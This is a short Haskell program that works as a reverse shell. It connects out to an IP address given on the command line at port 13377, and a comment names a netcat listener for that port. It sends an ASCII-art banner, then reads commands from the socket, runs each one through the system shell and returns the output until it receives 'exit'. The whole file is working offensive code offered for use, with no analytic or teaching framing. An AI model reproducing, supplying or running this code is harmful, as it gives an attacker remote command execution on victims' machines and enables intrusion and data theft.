import Network.Socket
import System.IO
import System.Process
import System.Environment

main :: IO ()
main = withSocketsDo $ do
    args <- getArgs
    case args of
        [ip] -> do
            let port = 13377 -- nc -l -p 13377
            addrInfo <- getAddrInfo Nothing (Just ip) (Just $ show port)
            let serverAddr = head addrInfo
            sock <- socket (addrFamily serverAddr) Stream defaultProtocol
            connect sock (addrAddress serverAddr)
            hdl <- socketToHandle sock ReadWriteMode
            hSetBuffering hdl LineBuffering

            let asciiArt = unlines
                    [ "  _____            _      _____          _      "
                    , " |  __ \\          | |    / ____|        | |     "
                    , " | |__) |___  __ _| |___| |     ___   __| | ___ "
                    , " |  _  // _ \\/ _` | |_  / |    / _ \\ / _` |/ _ \\"
                    , " | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/"
                    , " |_|  \\_\\___|\\__,_|_/___|\\_____\\___/ \\__,_|\\___|"
                    ]
            hPutStrLn hdl asciiArt

            loop hdl

            hClose hdl
        _ -> putStrLn "Please provide the IP address as a command-line argument."

loop :: Handle -> IO ()
loop hdl = do
    hPutStr hdl "$ "
    cmd <- hGetLine hdl
    if cmd == "exit"
        then return ()
        else do
            output <- readCommandOutput cmd
            hPutStrLn hdl output
            loop hdl

readCommandOutput :: String -> IO String
readCommandOutput cmd = do
    (_, Just hout, _, _) <- createProcess (shell cmd){ std_out = CreatePipe }
    hGetContents hout
